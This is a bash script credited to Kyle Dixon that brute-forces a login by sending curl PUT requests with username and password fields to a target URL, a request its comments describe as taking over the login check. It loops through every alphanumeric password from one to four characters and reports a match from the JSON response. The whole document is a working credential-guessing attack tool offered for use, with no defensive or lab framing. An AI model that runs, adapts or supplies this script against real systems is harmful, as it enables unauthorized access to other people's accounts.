#!/bin/bash
#
#   Author: Kyle Dixon
#   Description:  Brute forces password username combinations
#   Sources: 


#Test Function
function test() {
    res=$(curl --silent --request PUT "${2}" --data "user_name=${3}&user_pass=${1}")    #Send PUT which takes over login check, res = [{"total":1}] or [{"total":0}]
    check=$(echo $res | cut -c11-11)        #Get just the value, the 11th character
    if [[ "$check" == "1" ]]; then          #Check for a match
        echo -e "\e[38;5;198m[+] Match Found \e[0m"
        printf '[+] Password == %s\n' "$1"               #print matching password and exit
        exit 1
    fi
}

#Curl Authentication function
function createPass() {
    charArr=("a" "b" "c" "d" "e" "f" "g" "h" "i" "j" "k" "l" "m" "n" "o" "p" "q" "r" "s" "t" "u" "v" "w" "x" "y" "z" "A" "B" "C" "D" "E" "F" "G" "H" "I" "J" "K" "L" "M" "N" "O" "P" "Q" "R" "S" "T" "U" "V" "W" "X" "Y" "Z" "0" "1" "2" "3" "4" "5" "6" "7" "8" "9")
    url="${1}"
    username="${2}"
    echo "[*] Testing combinations..." 
    line=()
    for a in "${!charArr[@]}"
    do
        line[0]="${charArr["$a"]}"
        echo ${line}
        test "${line}" "${url}" "${username}"
    done

    for a in "${!charArr[@]}"
    do
        line[0]="${charArr["$a"]}"
        for b in "${!charArr[@]}"
        do
            line[1]="${charArr["$b"]}"
            pass=$(printf "%s" "${line[@]}")
            echo "${pass}"
            test "${pass}" "${url}" "${username}"
        done
    done

    for a in "${!charArr[@]}"
    do
        line[0]="${charArr["$a"]}"
        for b in "${!charArr[@]}"
        do
            line[1]="${charArr["$b"]}"
            for c in "${!charArr[@]}"
            do
                line[2]="${charArr["$c"]}"
                pass=$(printf "%s" "${line[@]}")
                echo "${pass}"
                test "${pass}" "${url}" "${username}"
            done
        done
    done

    for a in "${!charArr[@]}"
    do
        line[0]="${charArr["$a"]}"
        for b in "${!charArr[@]}"
        do
            line[1]="${charArr["$b"]}"
            for c in "${!charArr[@]}"
            do
                line[2]="${charArr["$c"]}"
                for d in "${!charArr[@]}"
                do
                    line[3]="${charArr["$d"]}"
                    pass=$(printf "%s" "${line[@]}")
                    echo "${pass}"
                    test "${pass}" "${url}" "${username}"
                done
            done
        done
    done
    echo -e "\e[38;5;198m[-] No Match Found \e[0m"
    exit 1
}

#Main function
if [ "${1}" = "-g" ]
then
    createPass "${3}" "${2}"
else
    echo "[*] Usage: -g + username + url"
    exit 1
fi
exit 0